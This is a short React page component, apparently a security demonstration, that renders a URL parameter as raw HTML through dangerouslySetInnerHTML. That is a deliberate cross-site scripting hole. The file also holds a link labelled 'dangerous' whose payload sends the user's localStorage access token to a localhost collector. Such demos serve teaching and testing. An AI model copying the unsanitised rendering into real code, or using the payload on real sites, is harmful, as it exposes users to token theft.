import { Link, useSearchParams } from "react-router";

const PublicNotePage: React.FC = () => {
  const [params] = useSearchParams();
  const note = params.get("note") ?? "";

  return (
    <div className="flex flex-col items-center justify-center h-screen">
      <h1 className="text-2xl font-bold mb-4">Public Note</h1>
      <div
        className="bg-gray-100 p-4 rounded shadow-md w-1/2"
        dangerouslySetInnerHTML={{ __html: note }}
      ></div>
      <a href="/" className="mt-4 text-blue-500 hover:underline">
        Go back to home
      </a>
      <Link
        to={`/public-note?note=<a href="javascript:void(fetch('http://localhost:5002/' %2B localStorage.getItem('access_token')));">Click me!</a>`}
        className="hover:text-red-700 text-red-500"
      >
        Visit dangerous public note
      </Link>
    </div>
  );
};

export default PublicNotePage;
